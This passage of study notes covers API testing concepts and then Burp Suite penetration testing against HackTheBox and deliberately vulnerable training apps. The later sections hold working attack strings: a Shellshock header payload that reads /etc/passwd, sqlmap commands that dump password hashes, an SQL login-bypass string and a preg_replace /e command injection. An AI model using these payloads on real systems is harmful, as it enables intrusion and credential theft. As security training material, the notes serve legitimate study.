				□ Authorized users can access only what they should.

				□ Unauthorized users cannot see restricted data.

		○ Timing Risks

			§ Order of requests: Network glitches or race conditions may cause out-of-order execution.

			§ Slow calls / timeouts: Need to test how APIs handle delays.

			§ Concurrency: Multiple users modifying the same resource simultaneously may lead to conflicts.

		○ Performance Risks

			§ APIs can be hit faster than human-driven UIs since they’re programmatic.

			§ Rate limiting: Prevents abuse by limiting request frequency.

			§ Without rate limiting: Malicious actors or buggy code could overload the system with a spike of requests.

		○ Security Risks

			§ APIs are common attack vectors because they’re easy to interact with via scripts.

			§ Risks include unauthorized access, injection attacks, or denial of service through traffic spikes.

			§ Even if not doing full penetration testing, testers should remain aware of security concerns.

#### API Authorization



Overview of Authorization and Authentication

	• APIs must be secured, and testers need to understand authentication and authorization in order to properly access and test API endpoints. These are distinct but often combined in practice.

	• Key Concepts

		○ API Security Challenges

			§ APIs are exposed to programmatic attacks, so security is critical.

			§ For testers, security adds complexity → must learn how to authenticate and authorize before testing endpoints.

			§ Testers should also validate that the security mechanisms themselves work as intended.

		○ Authentication

			§ Definition: Verifies who you are.

			§ Analogy: Showing an ID at a rental car counter.

			§ Failure case: If your ID doesn’t match you → you fail authentication.

			§ API context: Ensures the requester’s identity is valid (e.g., via username/password, tokens, or certificates).

		○ Authorization

			§ Definition: Verifies what you can do.

			§ Analogy: Even if the ID is valid, if you don’t have a reservation, you’re not allowed to rent the car.

			§ Failure case: Authenticated user but no permission for the requested action.

			§ API context: Controls access rights to specific actions or resources.



Basic Authorization in API calls

	• Basic authentication (Basic Auth) is one of the simplest ways to authenticate with an API. It works by sending a username and password in an Authorization header using Base64 encoding, but it has significant security risks if not used over a secure connection (HTTPS).

	• Key Concepts

		○ Basic Auth Mechanism

			§ Similar to logging into a website with a username and password.

			§ Sent in the Authorization header:

				Authorization: Basic <base64(username:password)>

			§ Example: username=postman, password=password → base64 encoded → placed after the word “Basic”.

		○ Base64 Encoding

			§ Base64 is not encryption, just an encoding scheme.

			§ Easy to decode (trivial for anyone intercepting traffic).

			§ Example shown with decoding a header string to reveal the raw credentials.

			§ Risk: If traffic is not encrypted (no HTTPS), credentials can be stolen easily.

		○ Security Considerations

			§ Must use HTTPS when using Basic Auth to protect credentials in transit.

			§ Avoid sending sensitive credentials in plaintext.

			§ For stronger security, consider more robust authentication methods (OAuth, API keys, tokens, etc.).

		○ Postman Demonstration

			§ Postman automates header creation when using its Authorization tab.

			§ Manual method: User can create their own Authorization header by encoding username:password into Base64 and appending it.

			§ Verified by sending a request and receiving authenticated = true.

		○ General API Call Data Transmission

			§ Data in an API call can be transmitted in three main ways:

				□ URL parameters (query strings).

				□ Request body (payload).

				□ Headers (metadata, including authentication).

			§ Authentication data always travels through one of these channels.



Using Authorization Tokens

	• Instead of using basic authentication, modern APIs often use authorization tokens. Tokens securely combine authentication (who you are) and authorization (what you can do) into one mechanism, making them more flexible and secure for API interactions.

	• Key Concepts

		○ Authorization Tokens

			§ Definition: A server-issued credential proving both identity and permissions.

			§ Anyone presenting the token can perform the actions that token allows.

			§ More secure and flexible than Basic Auth, since tokens can:

				□ Expire (time-limited).

				□ Be scoped to specific actions/endpoints (e.g., read, create, but not delete).

		○ Example: GitHub Personal Access Token

			§ Generated in GitHub Developer Settings.

			§ Can set expiration and scope (permissions) when creating the token.

			§ Example:

				□ Token allowed: read repos, create repos.

				□ Token denied: deleting repos → results in forbidden (403) error.

		○ Bearer Tokens in Practice

			§ Used in Authorization header like:

				Authorization: Bearer <token>

			§ Postman automatically adds this header when configured.

			§ Works similarly to Basic Auth header but much more secure and flexible.

		○ Usage Flow

			§ Generate token from service (GitHub in this case).

			§ Add token to Postman’s Bearer Token field.

			§ Make requests:

				□ GET repos → works (authorized).

				□ POST new repo → works (authorized).

				□ DELETE repo → fails (not authorized, scope excluded).



Finsing Bearer Tokens

	• APIs commonly use tokens for authentication/authorization, but the way you obtain and use these tokens varies across APIs. Testers and developers need to know common patterns, read documentation, and sometimes inspect traffic to figure out how tokens are issued and passed in requests.

	• Key Concepts

		○ How to Get Tokens

			§ Account/Form-based: Many APIs require creating an account or filling out a form to request a token (e.g., IUCN Threatened Species API).

			§ Direct provision: Some APIs provide sample tokens in documentation for testing.

			§ OAuth workflow: Common approach where you exchange a client ID and client secret for a token (e.g., Petfinder API).

		○ How Tokens Are Used in Requests

			§ Query string parameters: Rare, but some APIs place tokens directly in the URL (unusual and less secure).

			§ Headers (most common): Tokens usually passed via the Authorization header as a Bearer token.

			§ Custom headers: Some APIs define their own headers (e.g., X-Api-Key in The Dog API). Prefix X- is common but not required.

		○ Common Patterns in API Token Use

			§ Consistency varies: Each API can implement tokens differently—no universal rule.

			§ Documentation is key: Must read the API docs to know whether the token belongs in the header, body, or URL.

			§ Inspecting network traffic: Developer tools can reveal where tokens are being sent (e.g., Dog API’s X-Api-Key header).

			§ OAuth (Client ID + Secret exchange): A standardized scheme widely adopted for securely issuing tokens.



Setting up Oauth

	• explains how OAuth 2.0 works in practice, using the Imgur API as an example. OAuth is a widely used authentication and authorization framework that enables secure access to APIs (e.g., “Login with Google”). It involves registering an application, obtaining authorization from the user, and exchanging authorization codes for access tokens.

	• Key Concepts

		○ OAuth 2.0 Basics

			§ Purpose: Allows applications to securely access user data without sharing passwords directly.

			§ Common Usage: "Login with Google" or "Login with Facebook."

			§ Mechanism: Uses tokens (not credentials) to authenticate and authorize access.

		○ Registering an Application

			§ Developers must register their app with the API provider (e.g., Imgur).

			§ Registration requires:

				• Application name.

				• Callback/redirect URL (where users are sent after logging in).

				• Client ID and Client Secret (credentials identifying the app).

		○ OAuth Authorization Code Flow

			§ Step 1: Application requests access from the Authorization Server.

			§ Step 2: User is prompted to log in and consent.

			§ Step 3: Authorization server issues a short-lived authorization code.

			§ Step 4: Application exchanges that code at the /token endpoint with its Client ID + Secret to receive an access token.

			§ Step 5: Application uses the access token to call API endpoints on behalf of the user.

		○ Key Terms

			§ Authorization Server: System that validates user identity and issues tokens.

			§ Client ID \& Secret: Identifiers for the app making the request.

			§ Authorization Code: Temporary code proving user consent.

			§ Access Token: Credential allowing the app to interact with the API.

#### Additional API Testing Consideration



Using Mocks, Stubs, and Fakes, in API Testing

	• Mocks, stubs, and fakes (test doubles) are tools that let testers replace real system components with simulated ones during API testing. They make it easier to isolate and test specific parts of an API when the real dependencies are unavailable, unreliable, or would interfere with others.

	• Key Concepts

		○ Test Doubles

			§ Just like a stunt double in movies, test doubles stand in for real parts of the system during testing.

			§ These include mocks, stubs, and fakes, which all replace or simulate real implementations.

		○ Mocks

			§ Replace real implementations with fake ones.

			§ Useful when you need data from another system (e.g., third-party API) that you can’t or don’t want to call in a test environment.

			§ Example: Create a mock server in Postman to return a predefined response (like an empty list for a to-do app).

		○ Benefits of Using Mocks, Stubs, and Fakes

			§ Isolation: Test one part of a system without depending on external services.

			§ Controlled scenarios: Simulate specific situations that might be hard to reproduce (e.g., empty dataset, error response).

			§ Safe testing: Avoid disrupting shared test environments or external services.

		○ Cautions \& Limitations

			§ Using a fake implementation means you’re not testing the real system, so bugs may be missed.

			§ Test doubles should be balanced with real-world tests to ensure accuracy.

			§ They are powerful tools, but must be used thoughtfully and not as a replacement for real integration testing.



API Automation

	• API testing benefits hugely from automation, but automation and exploratory testing serve different goals. Use exploration to discover what matters; use automation to repeatedly check what must remain true.

	• Key Concepts

		○ Exploration vs. Automation

			§ Exploration: discovery, learning, finding new risks/behaviors.

			§ Automation: repetition to catch regressions; validates known, important behaviors.

		○ What to automate

			§ Stable contracts/things that shouldn’t change (endpoints, schemas, status codes).

			§ Signals you care about if they change (auth flows, critical workflows, response shapes).

			§ Aim for tests whose failures are actionable, not churn from expected evolution.

		○ Two common automation approaches

			§ Data-driven

				□ Sweep endpoints/parameters, validate responses broadly.

				□ Pros: wide coverage.

				□ Cons: can be slow, brittle, and high-maintenance if schemas/inputs evolve.

			§ Workflow-driven

				□ Chain calls to mimic real user/business flows.

				□ Pros: realistic, catches integration issues.

				□ Cons: need to pass state between steps; more orchestration logic.

		○ Design \& maintainability principles

			§ Treat suites like code: DRY helpers, shared fixtures, good naming, encapsulated data/setup.

			§ Prefer low-flakiness tests; isolate side effects; control test data.

			§ Be deliberate: not everything explored should be automated; optimize for long-term value.



Performance Testing

	• Performance testing helps evaluate how well an API (and the system it supports) behaves under different conditions, such as speed, load, and stress. APIs are powerful tools for performance testing because they allow programmatic, repeatable, and scalable test setups.

	• Key Concepts

		○ Performance Testing as a Broad Category

			§ Includes multiple forms of testing:

				□ Speed testing → How fast does a response come back?

				□ Load testing → How many requests per second/minute can the system handle?

				□ Stress testing → How does the system behave under extreme load or large datasets?

				□ Other related scenarios (scalability, concurrency, endurance).

		○ Using APIs for Load/Stress Testing

			§ APIs let you quickly generate large datasets without manual input.

			§ Example: Stress-testing a ToDo app by creating hundreds/thousands of tasks programmatically.

			§ Benefits:

				□ Saves time (no manual repetition).

				□ Creates controlled load conditions for testing.

			§ Can be done with scripts (Python + requests library) or tools like Postman.

		○ Using APIs for Speed Testing

			§ Measure response times by sending requests repeatedly.

			§ Collect statistics such as average runtime or distribution of response times.

			§ Can be done in:

				□ Postman (shows request time).

				□ Custom scripts (e.g., Python).

				□ Specialized tools (e.g., Apache JMeter) for deeper analysis.

		○ General Guidance

			§ APIs provide a realistic but programmatic entry point to test performance.

			§ Performance testing should go beyond just functional correctness → focus on scalability, efficiency, and robustness under load.

			§ The examples shown (scripts, Postman) are starting points; dedicated tools like JMeter are better for larger, more complex testing.



Security Testing

	• Security testing is critical for APIs. Authentication and authorization are important, but they are only part of the picture. APIs are a common attack surface, so testing must consider vulnerabilities like injection, input validation, and responsibility overlap between layers.

	• Key Concepts

		○ Don’t Reinvent Authentication/Authorization

			§ Use standard, proven auth protocols (OAuth, OpenID Connect, etc.).

			§ Rolling your own solution is error-prone unless you have the scale/resources of companies like Google.

		○ APIs as Attack Surfaces

			§ Attackers often target APIs because they are:

				□ Programmatic (easy to automate attacks).

				□ Central gateways to system data and logic.

			§ Common vulnerabilities:

				□ SQL Injection (SQLi)

				□ Cross-Site Scripting (XSS)

				□ Others like command injection, insecure direct object references.

		○ Shared Responsibilities

			§ Some vulnerabilities (e.g., XSS) can be mitigated at UI or API level.

			§ When responsibility overlaps, risk of gaps increases—must verify someone handles it.

		○ Input Validation

			§ APIs must enforce strict validation of inputs.

			§ Fuzzing (sending random/invalid inputs) is a common attacker technique.

			§ Example: If an API expects an integer, it should reject non-integers consistently.

		○ Security Testing Mindset

			§ Security testing is a specialized field, but testers should still:

				□ Be aware of common vulnerabilities.

				□ Try simple attacks (e.g., fuzzing, injection attempts).

				□ Verify enforcement of validation and authorization.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

### Burp Suite

#### Burp Suite Basics





What is Burp Suite?

	• Burp Suite is the industry-standard tool for professional web penetration testing, providing a complete and extensible framework to test modern web applications, portals, and APIs for vulnerabilities.

	• Key Concepts

		○ Context of Use

			§ Most modern applications are accessed through web portals (cloud services, on-prem apps, REST APIs).

			§ This makes web-based penetration testing a major focus for security testers.

		○ Need for Specialized Tools

			§ Web protocols (HTTP, HTTPS, REST) require tools that can:

				□ Understand and manipulate traffic.

				□ Detect vulnerabilities.

				□ Automate scanning.

		○ Comparison with Other Tools

			§ Simple scanners like Whatweb.

			§ Open-source tools like OWASP ZAP.

			§ But the preferred tool for professionals is Burp Suite.

		○ Capabilities of Burp Suite

			§ Web scanning: Find vulnerabilities in applications.

			§ Spidering: Crawl and discover all pages of a website.

			§ Proxying: Intercept and manipulate traffic between client and server.

			§ Message creation \& replay: Craft and send test inputs to web apps.

		○ Editions of Burp Suite

			§ Community Edition (Free): Limited features, but still powerful for beginners.

			§ Professional Edition: Full capabilities for pen testers.

			§ Enterprise Edition: Includes everything in Professional + integration into DevOps workflows for large organizations.





Getting to Know Burp Suite

	• This section introduces Burp Suite’s Community Edition interface and features, walking through its dashboard, target and proxy functions, and basic setup. It highlights the differences between the Community and Professional editions and explains how Burp Suite captures, filters, and manipulates traffic for penetration testing.

	• Key Concepts

		○ Starting Burp Suite

			§ Community Edition in Kali Linux: Found under Web Application Analysis.

			§ Temporary vs Persistent Projects:

				□ Community Edition only supports temporary projects.

				□ Professional Edition allows storing projects on disk (needed for full client work).

			§ Default startup: Temporary project + default settings.

		○ Interface Overview

			§ Menu items: Burp, Intruder, Repeater, Window, Help.

			§ Activity Ribbon: Quick access to Burp tasks and actions.

			§ Context Menus: Multiple ways to perform tasks; users develop their own workflow style.

		○ Dashboard

			§ Panels: Tasks, Event Logs, Issue Activity, Advisory Panel.

			§ Community Edition limitations: Only passive crawling is supported; no active scanning.

			§ Tasks and status buttons: Configure live tasks, scope, and scan settings.

		○ Target Functions

			§ Site Map: Displays target web-tree, requests/responses, and message exchanges.

			§ Inspector Panel: Extracts key details from messages for quicker review.

			§ Scope Settings: Define which URLs/traffic are in-scope, reducing noise.

			§ Issue Definitions: Built-in vulnerability references.

		○ Proxy Functions

			§ Components: Intercept, HTTP History, WebSockets History, Options.

			§ Intercept: Hold, modify, forward, or drop requests/responses.

			§ HTTP History: Logs all HTTP traffic (in/out of scope).

			§ WebSockets History: Logs real-time JSON packet exchanges in modern apps.

			§ Options:

				□ Set listening ports (default 8080).

				□ Configure which messages to intercept (requests, responses, WebSockets).

				□ Option to unhide hidden fields in responses.

				□ Match/replace rules for automated modifications.

		○ Advanced Features

			§ Multi-proxying: Burp can handle multiple listening proxies for complex setups.

			§ Collaboration Server (Professional Edition):

				□ Used for advanced testing like blind SQL injection.

				□ By default uses PortSwigger’s public server, but private servers can be configured.



Proxying Web Traffic

	• Burp Suite acts as a proxy tool that allows penetration testers to intercept, inspect, and manipulate web traffic between a browser (or mobile device) and a web application. Setting up a browser or device to route traffic through Burp Suite enables deeper analysis of requests and responses.

	• Key Concepts

		○ What Proxying Means

			§ Normally: Browser → Website directly.

			§ With Burp Suite: Browser → Burp Suite Proxy → Website.

			§ This enables testers to:

				□ Inspect requests and responses.

				□ Modify messages before they reach the server.

				□ Inject new traffic for testing.

		○ Using Burp Suite’s Built-in Brows

			§ Burp Suite includes its own browser pre-configured to work with its proxy.

			§ This avoids the need for manual setup.

		○ Configuring External Browsers (Example: Firefox in Kali)

			§ Steps to configure Firefox:

				□ Open Preferences → Network Settings.

				□ Change from No Proxy to Manual Proxy.

				□ Set proxy server to 127.0.0.1 (localhost).

				□ Set port to 8080.

				□ Apply same settings for HTTP, HTTPS, and FTP traffic.

		○ Proxying Mobile Traffic (Example: Android)

			§ Steps to configure Android network:

				□ Long press on the network name → Modify network.

				□ Check Show advanced options.

				□ Select Proxy → Manual.

				□ Set proxy address to the Burp Suite host machine’s IP.

				□ Set port to 8080.

			§ This allows intercepting mobile app/web traffic through Burp Suite.



Using Burp Suite as a Proxy

	• Burp Suite’s proxy function enables testers to intercept, analyze, and manage web traffic. The Community Edition allows passive traffic capture and scoping, while the Professional Edition adds automation like spidering/crawling and vulnerability scanning.

	• Key Concepts

		○ Using Burp’s Proxy and Browser

			§ Start with Proxy → Intercept (turn off intercept to let traffic flow).

			§ Burp launches its own Chromium-based browser.

			§ Navigating to a target (e.g., Metasploitable) sends all traffic through Burp, which records it in the Target → Site Map.

		○ Community Edition Capabilities

			§ Records only what you visit manually (no automated crawling/spidering).

			§ Message Exchanges Panel: Shows requests/responses for each page visited.

			§ Target Scope Control:

				□ Define what’s in-scope via Scope Settings or right-clicking specific targets.

				□ Out-of-scope traffic can be excluded to reduce clutter.

			§ Discovery Example: Found a hidden database password in an HTML comment — showing how even simple inspection can reveal vulnerabilities.

		○ Scope Management

			§ Add/remove specific URLs or directories to scope.

			§ Burp can filter out-of-scope traffic and focus on target systems.

			§ Example: Added Mutillidae and DVWA to scope to ensure their traffic is captured.

		○ Community vs. Professional Edition

			§ Community Edition:

				□ Passive recording only.

				□ No automated spidering or active vulnerability scanning.

			§ Professional Edition:

				□ Adds Passive Scanning: Crawls site to discover pages.

				□ Adds Active Scanning: Actively tests discovered pages for vulnerabilities.

				□ Results appear in the Issues Pane as vulnerabilities are detected.



Setting Up Additional Targets

	• To practice penetration testing with Burp Suite, it’s helpful to have multiple vulnerable web applications set up as targets. The transcript demonstrates setting up OWASP’s Broken Web Application (BWA) and Xtreme Vulnerable Web Application (XVWA) for training and hands-on practice.

	• Key Concepts

		○ OWASP Broken Web Application (BWA) VM

			• Downloadable virtual machine appliance.

			• Contains multiple deliberately vulnerable apps for training, including:

				□ WebGoat (Java-based security lessons).

				□ RailsGoat (Ruby on Rails vulnerabilities).

				□ Damn Vulnerable Web Application (DVWA).

				□ Security Shepherd (gamified web security trainer).

				□ Mutillidae II (updated version of Mutillidae).

				□ Real-world examples like OrangeHRM (older HR management app).

			• Provides a consolidated environment for security training.

		○ Xtreme Vulnerable Web Application (XVWA)

			• A PHP/SQL-based vulnerable app designed for practice.

			• Can be hosted on a Kali Linux system.

			• Setup steps:

				□ Start Apache and MySQL services:

					sudo service apache2 start  

					sudo service mysql start

				□ Clone repository into web root:

					cd /var/www/html  

					sudo git clone https://github.com/s4n7h0/xvwa.git

				□ Create and configure database:

					sudo mysql -u root -e "create database xvwa;"  

					sudo mysql -u root -e "grant all privileges on \*.\* to xman@localhost identified by 'xman';"

				□ Update config.php with the new username/password (xman/xman).

				□ Complete setup by visiting the XVWA site in a browser.

		○ Why Multiple Targets Help

			• Different apps expose testers to different languages, frameworks, and vulnerabilities.

			• Expands hands-on skills with Burp Suite.

			• Encourages real-world practice beyond a single testbed (e.g., Metasploitable).



#### Scanning



Crawling the Website

	• Burp Suite Professional Edition enables automated crawling and auditing of a website. The crawler systematically explores the site, while the auditor tests for vulnerabilities, highlighting issues with severity levels. Authentication can also be configured to extend testing into protected areas.

	• Key Concepts

		○ Crawling in Burp Suite Professional

			• Crawling = Automated exploration of a website’s structure and links.

			• Initiated by right-clicking a target in the Site Map and opening the scan panel.

			• Parameters include the target URL, HTTP/HTTPS options, etc.

			• Crawl results populate the website tree in the Site Map.

		○ Auditing (Vulnerability Testing)

			• After crawling, Burp Suite automatically starts auditing discovered pages.

			• Issues appear in the Issues Pane (top-right), categorized by severity.

			• Red dots in the Site Map indicate high-severity vulnerabilities.

			• Each issue includes:

				□ Advisory details.

				□ Request and response messages that triggered detection.

		○ Example Findings

			• File Path Manipulation in Mutillidae.

			• OS Command Injection vulnerabilities.

			• Each vulnerability can be inspected alongside the associated web page and traffic.

		○ Authenticated Scans

			• Burp Suite supports scanning behind login forms.

			• Testers can configure application credentials:

				□ Example: DVWA → username: admin, password: password.

			• Burp will automatically use these credentials to log in during crawling, enabling deeper testing of protected content.



Finding Hidden Webpages

	• Web servers often have hidden or unlinked pages (e.g., admin consoles, configuration files, secondary apps). Burp Suite provides built-in tools to perform content discovery, similar to external tools like DirBuster or Gobuster, to uncover these hidden endpoints.

	• Key Concepts

		○ Why Hidden Pages Matter

			§ Many web applications expose unlinked resources:

				□ Admin portals (/admin).

				□ Configuration files (e.g., phpinfo.php, phpmyadmin).

				□ Application subdirectories.

			§ These may contain sensitive functionality or credentials.

			§ They are not discoverable through normal navigation since they aren’t linked.

		○ Discovery Tools

			§ External tools: dirb, Gobuster, DirBuster.

			§ Burp Suite’s built-in content discovery offers similar functionality.

		○ Burp Suite Discovery Workflow

			§ Set Scope: Add target (e.g., 10.10.10.191) to ensure focused results.

			§ Crawl: Initial automated crawl finds linked pages.

			§ Engagement Tools → Discover Content:

				□ Configure parameters:

					® Set crawl depth (e.g., depth 2).

					® Choose wordlists (e.g., DirBuster medium).

					® Exclude unnecessary file extensions.

				□ Run discovery session.



Understanding Message Content

	• To effectively use Burp Suite for penetration testing, testers must understand how messages (requests and responses) are displayed, analyzed, and manipulated. Burp Suite provides multiple views, search tools, and inspectors to uncover details that may not be visible in the browser, such as hidden fields or injected parameters.

	• Key Concepts

		○ Message Panels in Burp Suite

			§ Contents Panel:

				□ Shows overall message exchanges with timestamp, status, length, content type, and webpage title.

			§ Request \& Response Panels:

				□ Can be viewed raw, in “pretty” formatted mode, or “rendered” as processed HTML.

				□ Configurable layout: side-by-side, vertical, or tabbed.

			§ Inspector: Extracts key details like request attributes, request/response headers.

		○ Search and Analysis Features

			§ Search boxes allow keyword matching in request/response panels.

			§ Supports case-sensitive and regex searches.

			§ Context menus and dropdowns provide shortcuts for analyzing and acting on data.

		○ Understanding HTTP Data Encoding

			§ Input fields in forms are sent as key=value pairs concatenated with “\&”.

			§ Example: payee=SPRINT\&amount=75.

			§ Shows how what’s visible in the browser may differ from what’s actually sent in the request.

		○ Detecting Hidden or Unexpected Data

			§ Example: Anonymous feedback form added a user ID (3487) automatically, even though the user didn’t provide it.

			§ Burp’s Response Modification Option (“unhide hidden form fields”) reveals hidden fields in web forms.

			§ Hidden fields may be used for tracking, fingerprinting, or security tokens.

		○ Headers and Security Testing

			§ Important details may appear in message headers:

				□ Session IDs.

				□ Authorization tokens.

				□ Other credentials.

			§ Headers are potential targets for specific attacks, e.g.:

				□ Web cache poisoning.

				□ Virtual host brute forcing.



Finding Missing Content

	• When analyzing web traffic in Burp Suite, important messages (like failed logins or authorization headers) may not always appear in the main panels. Testers must know how to adjust view settings, use interception, and check HTTP history to ensure no crucial content is missed during penetration testing.

	• Key Concept

		○ Login Testing Scenario (HackTheBox “Jerry”)

			§ Target: Tomcat server on port 8080.

			§ Attempted login (tomcat:tomcat) produces a 401 Unauthorized response.

			§ Credentials are sent but not immediately visible in the main Site Map view.

		○ Why Content Can Be Missing

			§ Burp Suite may filter out certain responses (e.g., 4xx errors).

			§ By default, these aren’t shown in the messages panel.

			§ Users must adjust the view filter settings (e.g., click “Show all”).

		○ Capturing Authorization Headers

			§ With Proxy → Intercept on, login requests show full HTTP messages.

			§ Example: Request to /manager/html includes an Authorization header (Base64-encoded credentials).

			§ Decoding reveals credentials (e.g., tomcat:tomcat, bobcat:bobcat, kitty:kitty).

		○ Differences Between Browsers

			§ Using Burp’s embedded browser vs. external browsers (like Kali Firefox) can affect what appears in the Site Map.

			§ Some messages are overwritten in the Content panel (only the last attempt may be displayed).

		○ Using HTTP History

			§ To recover all prior requests/responses, use Proxy → HTTP History.

			§ Provides the full sequence of messages, including:

				□ Attempts without authorization headers.

				□ Attempts with Base64-encoded credentials.

			§ Ensures no traffic is lost even if panels overwrite earlier data.

		○ Fundamental Lesson

			§ Don’t rely solely on one panel in Burp Suite.

			§ If traffic looks incomplete or missing:

				□ Check filter settings.

				□ Use intercept mode.

				□ Inspect HTTP history for the full picture.

#### Man in the Middle



Interpreting Bank Transactions

	• Burp Suite can be used to intercept and manipulate live web transactions, demonstrating how attackers could modify sensitive actions (like bank transfers) during transmission. This highlights the risk of man-in-the-middle (MITM) attacks when data isn’t protected by strong security controls (e.g., HTTPS).

	• Key Concepts

		○ Burp Suite Interception in Action

			§ User logs into a demo online banking site with credentials (username/password).

			§ Performs a fund transfer of $10 from savings to brokerage.

			§ With Intercept ON in Burp Suite:

				□ The request is captured showing transaction details (amount, source, destination, comment).

				□ Tester changes the transfer amount from $10 to $99.

				□ Burp forwards the modified request.

				□ Result: The bank confirms a $99 transfer, proving successful message tampering.

		○ Vulnerability Demonstrated

			§ Unencrypted or weakly protected traffic can be intercepted and modified.

			§ Attacker could alter:

				□ Transaction amount.

				□ Destination account.

				□ Other form parameters (e.g., comments, metadata).

		○ Security Risk Highlighted

			§ Using online banking over public Wi-Fi without proper protections exposes users to MITM attacks.

			§ Attackers could impersonate the server, intercept traffic, and modify financial transactions.

		○ Underlying Lesson

			§ Burp Suite interception illustrates the importance of:

				□ Transport security (TLS/HTTPS) to prevent message tampering.

				□ Server-side validation to ensure integrity of transactions.

				□ Defense in depth (e.g., cryptographic checks, multifactor confirmation).



Exploiting Headers

	• Burp Suite can be used to exploit vulnerabilities in HTTP headers, such as the Shellshock vulnerability in Bash CGI scripts, to achieve remote code execution on a target system.

	• Key Concepts

		○ Initial Reconnaissance

			§ Target: HackTheBox system Shocker (10.10.10.56).

			§ Initial site crawl and scan revealed little content.

			§ Used Burp’s Engagement Tools → Discover Content:

				□ Found /cgi-bin/ directory.

				□ Discovered user.sh script inside.

		○ Testing the CGI Script

			§ Visiting /cgi-bin/user.sh returned a basic uptime response.

			§ Indicated the script is executable server-side (a common CGI trait).

		○ Exploiting with Shellshock

			§ Vulnerability: Bash’s Shellshock bug (CVE-2014-6271).

			§ Attack method: Inject payload via custom HTTP headers.

			§ Process in Burp:

				□ Right-click request → Send to Repeater.

				□ Modify the User-Agent header with a Shellshock payload:

					® () { :; }; echo; /bin/bash -c "whoami"

				□ Response: Returned shelly → command execution confirmed.

		○ Escalating the Exploit

			§ Replacing whoami with other commands:

				□ cat /etc/passwd → dumped password file.

				□ ls /home/shelly → listed Shelly’s home directory.

				□ cat user.txt → retrieved user flag (proof of compromise).

		○ Core Lesson

			§ Message headers are not just metadata; they can be attack vectors.

			§ Burp Suite’s Repeater tool makes it easy to manipulate headers and test payloads.

			§ The Shellshock case demonstrates how a single vulnerable script can lead to full system compromise.



Inserting an SQL Injection via Burp Suite

	Burp Suite can work alongside SQLmap to identify and exploit SQL injection vulnerabilities in web applications. Using captured requests from Burp, testers can craft injections (like union queries) to bypass authentication and gain unauthorized access to backend databases and admin portals.

	• Key Concepts

		○ Target Setup

			§ Target: Europa Corp Admin Portal (admin-portal.europacorp.htb).

			§ Configured in /etc/hosts and set within Burp’s target scope.

			§ Login form requires email + password.

		○ Capturing Login Requests

			§ Used Burp Suite to capture a POST request with test credentials (test@test.nz / password).

			§ The captured request contains the parameters needed for injection testing.

		○ Using SQLmap with Burp Data

			§ Extracted the POST data from Burp’s captured message.

			§ Ran SQLmap with:

				sqlmap -u https://admin-portal.europacorp.htb/login.php --data="email=test@test.nz\&password=password" --dbms=mysql

			§ SQLmap confirmed three SQL injection vectors.

			§ Enumeration revealed:

				□ Databases: information\_schema, admin.

				□ Inside admin: a user's table containing usernames and password hashes.

		○ Manual Exploitation with Burp Repeater

			§ Knowledge from SQLmap showed the login query had five columns.

			§ Used Burp’s Repeater to inject a UNION-based SQL injection:

				email=test@test.nz' OR 1=1 LIMIT 1 --  

			§ Modified request successfully bypassed authentication.

			§ Redirection confirmed access to the admin portal.

		○ Key Lessons

			§ Burp Suite helps capture and manipulate raw HTTP requests.

			§ SQLmap automates vulnerability detection and database enumeration.

			§ Together, they provide a workflow for finding and exploiting SQL injection:

				□ Capture request in Burp.

				□ Feed into SQLmap for automated testing.

				□ Return to Burp to craft custom injections.

				□ Achieve authentication bypass or extract sensitive data.

				



Saving Request Messages for Further Exploitation

	• Burp Suite allows testers to save complete HTTP request messages for later use. These saved requests can be fed directly into SQLmap for automated SQL injection testing and database exploitation, providing an efficient workflow for vulnerability analysis.

	• Key Concepts

		○ Target System

			§ Hack The Box server Falafel (10.10.10.73).

			§ Website presents a login page.

			§ Observed behavior:

				□ Valid username, wrong password → “wrong identification” response.

				□ Invalid username → “try again” response.

			§ This distinction suggests a potential SQL injection vulnerability.

		○ Saving Request Messages in Burp Suite

			§ Captured the POST login request from Burp’s Site Map.

			§ Used Actions → Copy to File to save it as falafel.txt.

			§ This file contains the raw HTTP request, which SQLmap can process directly.

		○ Using SQLmap with Saved Requests

			§ SQLmap command:

				sqlmap -r falafel.txt --string "wrong identification"

				□ -r falafel.text = run SQLmap using the saved HTTP request.

				□ --string "wrong identification" = tells SQLmap what valid response to expect.

			§ SQLmap identified the injection vulnerability.

		○ Database Enumeration and Exploitation

			§ With injection confirmed, further SQLmap commands were run:

				□ --dbs → listed databases: falafel, information\_schema.

				□ -D falafel --tables → listed tables in the Falafel DB.

				□ -D falafel -T users --dump → dumped the users table.

			§ Results: Extracted usernames (admin, Chris) and password hashes.

			§ Next logical step (not shown): password cracking.

		○ Key Lessons

			§ Saving Burp request messages is a powerful way to bridge manual and automated testing.

			§ SQLmap can use full HTTP requests instead of just parameters, enabling:

				□ More reliable testing.

				□ Easier handling of complex requests.

			§ Recognizing different server responses helps identify injection points.



Injecting Commands into Messages

	• Burp Suite can be used to intercept and modify HTTP messages in order to exploit application vulnerabilities. In this case, a flaw in PHP’s preg\_replace function (with the /e modifier) allows remote command execution by injecting system commands into intercepted requests.

	• Key Concepts

		○ Target and Setup

			§ Target: Europa admin console → Tools page.

			§ Functionality: Generates a VPN script using a user-supplied IP address.

			§ The IP input is processed by a PHP preg\_replace function, which is vulnerable when used with the /e modifier.

		○ Understanding the Vulnerability

			§ The /e flag in preg\_replace interprets replacement strings as PHP code, enabling arbitrary command execution.

			§ By manipulating the request, attackers can substitute the IP field with PHP system commands.

		○ Exploitation Steps with Burp Suite

			§ Enter a placeholder IP (e.g., 10.10.10.99) and generate the script.

			§ Enable Burp Proxy → Intercept ON to capture the POST request to tools.php.

			§ Modify the payload:

				pattern=something%2Fe

				ip\_address=system('ls -al /')

				text=something

				□ %2F used for forward slashes (URL encoding).

				□ Command embedded into the IP field.

			§ Adjust Content-Length to match the new payload.

			§ Forward the request.

		○ Results of Injection

			§ First payload (ls -al /) → root directory listing returned.

			§ Second payload (ls -al /home) → revealed user directory (john).

			§ Third payload (cat /home/john/user.txt) → successfully dumped the user token.

		○ Key Lessons

			§ Message interception and modification is a powerful penetration testing technique.

			§ Vulnerabilities in backend functions (e.g., preg\_replace /e) can be leveraged for remote command execution.

			§ Burp Suite provides the control needed to adjust payloads (intercept, edit, recalc content length) for successful exploitation.



#### Being an Intruder



Introducing the Intruder

	• Burp Suite’s Intruder tool automates customized attacks on web applications, such as brute-force login attempts. It allows testers to select input fields as payload positions, supply wordlists, apply transformations, and analyze responses to discover valid credentials or exploit vulnerabilities.

	• Key Concepts

		○ Setting Up the Intruder Attack

			§ Target: DAB server (HackTheBox) at 10.10.10.86 on port 80.

